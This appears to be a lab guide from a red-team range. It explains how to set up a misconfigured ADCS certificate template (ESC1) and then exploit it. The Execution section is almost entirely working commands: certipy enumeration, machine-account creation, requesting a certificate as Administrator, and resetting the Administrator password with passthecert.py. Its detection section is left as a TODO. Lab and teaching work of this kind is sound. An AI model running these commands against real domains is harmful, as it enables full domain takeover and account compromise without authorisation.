# Certificate Template Abuse
## Summary

Certificate Template Abuse is a technique that can be used to impersonate/take control of any user in a domain given a misconfiguration in certificate templates in the Active Directory Certificate Services (ADCS). To learn more about this technique, please visit [this excellent blog post.](https://posts.specterops.io/certified-pre-owned-d95910965cd2)

## Prerequisites

Active Directory with ADCS set up and configured. A certificate template must be created where the enrollee can specify the Subject Alternative Name (SAN), and can authenticate via the template. Further, a non-privileged account or group must be able to enroll into the template and the attacker must have control over that account or group.

## Setup

First, a domain controller must be configured. It is important to *NOT* install the Certificate Services PRIOR to promoting to a domain controller. Failure to abide by this will prevent you from promoting the server into a domain controller. Thank you Windows! Once "Active Directory Domain Services" has been installed and the server has been promoted, then and only then install "Active Directory Certificate Services" from the "Add Roles and Features" menu.

All of the defaults when adding ADCS to the range are fine. Only the "Certificate Authority" is required, and the setup type of the CA should be set to "Enterprise CA".

![image](./images/Pasted%20image%2020230719113536.png)

Next, go to Tools -> Certification Authority, and then right click -> Manage on Certificate Templates.

![image](./images/Pasted%20image%2020230719113831.png)

Find a template that has the most features enabled that you want to use, in this case I chose "Workstation Authentication", and then I duplicated the template.

![image](./images/Pasted%20image%2020230719120516.png)

For ESC1, change the Subject Name to be handled by the enrollee by selecting "Supply in the request".

![image](./images/Pasted%20image%2020230719114320.png)

To add or remove specific features, modify the Application Policies in the Extensions tab.

![image](./images/Pasted%20image%2020230719114419.png)

To control who can enroll, change the settings in the Security tab.

![image](./images/Pasted%20image%2020230719115833.png)

With the new template created, close the window and then click on "Certificate Templates", and then go to Action -> New -> Certificate Template to Issue. Select the template that was just created in the following window and click OK.

![image](./images/Pasted%20image%2020230719130337.png)

LDAP needs to have SSL enabled to authenticate using the certificates. Reboot the DC after all of these changes have been made. God fucking help you if LDAPS doesn't work, cause he didn't help me.

## Execution

### Method 1 - ESC1

The first step is to determine if any certificate template is vulnerable. Using the [certipy](https://github.com/ly4k/Certipy) utility, run the following command to query the ADCS service:

```bash
certipy find -u username -p password -dc-ip <ip>
```

The command should product a txt and json file. Use the `jq` command below to trim out irrelevant details:

```bash
jq '."Certificate Templates" | .[] | select(.Enabled == true) | select(."[!] Vulnerabilities" != null) | {"Template Name", "Client Authentication", "Any Purpose", "Enrollee Supplies Subject", "Permissions", "[!] Vulnerabilities"}' <certipy_output>.json
```

![JQ Output](./images/Pasted%20image%2020230718150901.png)

In this case, the "CorpVPN" template can be used in this exploit. It's important to take note of the CA used in the template, underneath the "Certificate Authorities" block.

In this example, the "Domain Computers" group is able to enroll a certificate. If the user under our control has the ability to create a user account, the following command can be used:

```bash
addcomputer.py -dc-ip <ip> -computer-pass 'Password123' -computer-name 'ComputerName' 'domain.com/username:password' -computer
-group 'CN=Domain Computers,DC=domain,DC=com'
```

![addcomputer.py](./images/Pasted%20image%2020230718145531.png)

Now, using the computer account that was just created, the following certipy command will attempt to abuse the misconfiguration and will return the certifcate and key in a pfx file for the Administrator account:

```bash
certipy req -u 'ComputerName$' -p 'Password123' -dc-ip <ip> -ca '<ASSIGNED-CA>' -template 'CorpVPN' -upn 'Administrator'
```

If the command times out, repeat several times until the output resembles the following:

![pfx file](./images/Pasted%20image%2020230718145653.png)

Some tools may not be able to handle the pfx file, so the following certipy commands will break it into the certificate and key files:

```bash
certipy cert -pfx administrator.pfx -nokey -out administrator.crt
certipy cert -pfx administrator.pfx -nocert -out administrator.key
```

Finally, using [this github repo](https://github.com/AlmondOffSec/PassTheCert/tree/main/Python),  download the "passthecert.py" file to utilize the certificate and key to change the Administrators password:

```bash
passthecert.py -action modify_user -target administrator -new-pass 'Pwned!!' -domain 'domain.com' -dc-ip <ip> -crt administrator.crt -key administrator.key
```

![passthecert](./images/Pasted%20image%2020230718150333.png)

At this point the Administrator users password should be changed to "Pwned!!".

#### Indicators of Compromise

TODO